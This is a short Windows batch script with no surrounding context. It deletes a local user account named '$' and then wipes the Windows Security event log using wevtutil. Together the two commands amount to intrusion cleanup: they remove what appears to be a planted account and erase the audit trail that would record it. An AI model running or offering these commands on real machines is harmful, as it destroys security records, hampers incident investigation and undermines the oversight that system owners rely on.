@echo off
net user $ /delete
wevtutil.exe cl "Security"